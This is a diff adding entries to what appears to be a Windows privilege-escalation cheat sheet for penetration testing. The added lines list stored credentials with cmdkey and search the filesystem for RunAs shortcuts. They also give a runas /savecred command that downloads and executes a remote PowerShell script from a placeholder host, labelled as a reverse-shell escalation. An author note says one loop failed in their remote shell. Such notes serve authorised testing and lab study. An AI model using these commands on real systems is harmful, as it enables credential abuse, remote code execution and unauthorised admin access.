@@ -79,6 +79,20 @@ Always run this when possible.
 
 ## Enumeration
 
+Display Stored Usernames and Credentials
+`cmdkey /list`
+
+Find RunAs Shortcuts
+```
+gci ​"C:\"​ *.lnk -recurse -force | ft fullname | ​out-file shortcuts.txt
+foreach​ (​$file​ ​in​ gc .\shortcuts.txt) { ​write-output​ ​$file​; gc ​$file​ | sls​ runas }
+
+NOTE: The foreach loop did not work in my remote shell when testing this, but I've noted it to come back to.
+```
+
+Elevate Privs Using RunAs SaveCred with Revshell
+`runas /user:domain\adminusername /savecred ​"powershell -c iex (new-object net.webclient).downloadstring('http://ipaddress/file')"`
+
 Net User Groups
 `net user username`
 
